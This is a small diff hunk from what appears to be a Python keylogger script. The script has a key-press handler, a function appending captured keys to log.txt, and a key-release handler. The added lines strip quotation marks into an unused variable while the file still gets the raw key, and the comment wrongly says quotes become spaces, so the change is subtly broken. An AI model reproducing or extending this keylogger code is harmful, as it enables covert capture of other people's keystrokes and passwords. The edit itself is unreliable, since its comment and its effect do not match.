@@ -23,6 +23,8 @@ def on_press(key):
 def write_file(keys):
     with open("log.txt", "a") as f:
         for key in keys:
+            # replaces quotation marks with a space
+            k = str(key).replace("'","")
             f.write(str(key))
 
 #function to record when a key is released
